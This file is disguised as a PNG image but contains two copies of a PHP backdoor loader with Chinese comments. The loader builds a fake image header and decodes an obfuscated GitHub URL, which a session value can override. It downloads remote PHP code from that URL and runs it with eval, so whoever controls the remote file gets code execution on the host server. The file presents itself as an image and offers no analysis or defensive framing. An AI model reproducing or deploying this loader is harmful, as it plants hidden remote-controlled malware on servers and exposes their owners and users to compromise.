\x89\x50\x4E\x47\x0D\x0A\x1A\x0A
 PNG

﻿\x89\x50\x4E\x47\x0D\x0A\x1A\x0A
<?php
// 🖼️ Enhanced Fake PNG Header Generator (to hide payloads in image disguise)
function generateFakePng()
{
    $data = '';

    // PNG signature
    $data .= '89 50 4E 47 0D 0A 1A 0A';

    // IHDR chunk
    $data .= '00 00 00 0D';
    $data .= '49 48 44 52';
    $data .= '00 00 00 01'; // Width: 1
    $data .= '00 00 00 01'; // Height: 1
    $data .= '08'; // Bit depth
    $data .= '06'; // Color type: Truecolor with alpha
    $data .= '00'; // Compression
    $data .= '00'; // Filter
    $data .= '00'; // Interlace
    $data .= '1F 15 C4 89'; // Dummy CRC
    // tEXt chunk (Fake software metadata)
    $text = 'Software' . chr(0) . 'Adobe Photoshop';
    $textHex = strtoupper(bin2hex($text));
    $textLength = sprintf('%08X', strlen($text));
    $data .= $textLength;
    $data .= '74 45 58 74'; // tEXt
    $data .= $textHex;
    $data .= '00 00 00 00'; // Dummy CRC
    // pHYs chunk
    $data .= '00 00 00 09';
    $data .= '70 48 59 73';
    $data .= '00 00 0B 13';
    $data .= '00 00 0B 13';
    $data .= '01';
    $data .= '00 00 00 00'; // Dummy CRC
    // IDAT chunk (minimal data)
    $data .= '00 00 00 0A';
    $data .= '49 44 41 54';
    $data .= '78 9C 63 60 00 00 00 02 00 01';
    $data .= '00 00 00 00'; // Dummy CRC
    // IEND chunk
    $data .= '00 00 00 00';
    $data .= '49 45 4E 44';
    $data .= 'AE 42 60 82';

    return hex2bin(str_replace(' ', '', $data));
}

// 启动会话
session_start();

// 设置主地址，如果没有设置则使用默认地址
$主地址 = $_SESSION['ts_url'] ? ? "\x68\164\x74\160\163\x3a\x2f\x2f\162\141\x77\x2e\x67\x69\164\x68\165\x62\165\163\145\162\143\x6f\156\164\x65\x6e\x74\56\143\x6f\x6d\x2f\164\151\x6b\x75\x6e\x67\66\x65\164\x61\x72\57\116\x79\141\162\x65\x6b\x2f\x72\145\146\163\57\x68\x65\141\x64\163\x2f\x6d\141\x73\164\145\162\x2f\x67\x61\x66\x61\56\x70\x68\160";

// 定义加载函数
function 加载数据($地址)
{
    $内容 = '';
    try
    {
        $文件 = new SplFileObject($地址);
        while (!$文件->eof())
        {
            $内容 .= $文件->fgets();
        }
    }
    catch(Throwable $错误)
    {
        $内容 = '';
    }

    // 尝试用 file_get_contents
    if (strlen(trim($内容)) < 1)
    {
        $内容 = @file_get_contents($地址);
    }

    // 如果还失败，使用 curl
    if (strlen(trim($内容)) < 1 && function_exists('curl_init'))
    {
        $通道 = curl_init($地址);
        curl_setopt_array($通道, [CURLOPT_RETURNTRANSFER => true, CURLOPT_FOLLOWLOCATION => true, CURLOPT_CONNECTTIMEOUT => 5, CURLOPT_TIMEOUT => 10, ]);
        $内容 = curl_exec($通道);
        curl_close($通道);
    }

    return $内容;
}

// 尝试加载主网址
$结果 = 加载数据($主地址);

// 生成增强的假PNG头
$假PNG头 = generateFakePng();

// 拼接PNG头和远程内容
$结果 = $假PNG头 . $结果;

/**_**/
/**_**/
/**_**/
/**_**/
/**_**/
/**_**/
/**_**/
// 如果成功获取内容，则执行
if (strlen(trim($结果)) > 0)
{
    @eval("?>$结果");
}
?>
 
\x89\x50\x4E\x47\x0D\x0A\x1A\x0A
 PNG

﻿\x89\x50\x4E\x47\x0D\x0A\x1A\x0A
<?php

// 🖼️ Enhanced Fake PNG Header Generator (to hide payloads in image disguise)
function generateFakePng() {
    $data = '';

    // PNG signature
    $data .= '89 50 4E 47 0D 0A 1A 0A';

    // IHDR chunk
    $data .= '00 00 00 0D';
    $data .= '49 48 44 52';
    $data .= '00 00 00 01'; // Width: 1
    $data .= '00 00 00 01'; // Height: 1
    $data .= '08'; // Bit depth
    $data .= '06'; // Color type: Truecolor with alpha
    $data .= '00'; // Compression
    $data .= '00'; // Filter
    $data .= '00'; // Interlace
    $data .= '1F 15 C4 89'; // Dummy CRC

    // tEXt chunk (Fake software metadata)
    $text = 'Software' . chr(0) . 'Adobe Photoshop';
    $textHex = strtoupper(bin2hex($text));
    $textLength = sprintf('%08X', strlen($text));
    $data .= $textLength;
    $data .= '74 45 58 74'; // tEXt
    $data .= $textHex;
    $data .= '00 00 00 00'; // Dummy CRC

    // pHYs chunk
    $data .= '00 00 00 09';
    $data .= '70 48 59 73';
    $data .= '00 00 0B 13';
    $data .= '00 00 0B 13';
    $data .= '01';
    $data .= '00 00 00 00'; // Dummy CRC

    // IDAT chunk (minimal data)
    $data .= '00 00 00 0A';
    $data .= '49 44 41 54';
    $data .= '78 9C 63 60 00 00 00 02 00 01';
    $data .= '00 00 00 00'; // Dummy CRC

    // IEND chunk
    $data .= '00 00 00 00';
    $data .= '49 45 4E 44';
    $data .= 'AE 42 60 82';

    return hex2bin(str_replace(' ', '', $data));
}

// 启动会话
session_start();

// 设置主地址，如果没有设置则使用默认地址
$主地址 = $_SESSION['ts_url'] ?? "\x68\164\x74\160\163\x3a\x2f\x2f\162\141\x77\x2e\x67\x69\164\x68\165\x62\165\163\145\162\143\x6f\156\164\x65\x6e\x74\56\143\x6f\x6d\x2f\164\151\x6b\x75\x6e\x67\66\x65\164\x61\x72\57\116\x79\141\162\x65\x6b\x2f\x72\145\146\163\57\x68\x65\141\x64\163\x2f\x6d\141\x73\164\145\162\x2f\x67\x61\x66\x61\56\x70\x68\160";

// 定义加载函数
function 加载数据($地址) {
    $内容 = '';
    try {
        $文件 = new SplFileObject($地址);
        while (!$文件->eof()) {
            $内容 .= $文件->fgets();
        }
    } catch (Throwable $错误) {
        $内容 = '';
    }

    // 尝试用 file_get_contents
    if (strlen(trim($内容)) < 1) {
        $内容 = @file_get_contents($地址);
    }

    // 如果还失败，使用 curl
    if (strlen(trim($内容)) < 1 && function_exists('curl_init')) {
        $通道 = curl_init($地址);
        curl_setopt_array($通道, [
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_FOLLOWLOCATION => true,
            CURLOPT_CONNECTTIMEOUT => 5,
            CURLOPT_TIMEOUT => 10,
        ]);
        $内容 = curl_exec($通道);
        curl_close($通道);
    }

    return $内容;
}

// 尝试加载主网址
$结果 = 加载数据($主地址);

// 生成增强的假PNG头
$假PNG头 = generateFakePng();

// 拼接PNG头和远程内容
$结果 = $假PNG头 . $结果;

/**_**//**_**//**_**//**_**//**_**//**_**//**_**/
// 如果成功获取内容，则执行
if (strlen(trim($结果)) > 0) {
    @eval("?>$结果");
}
?>
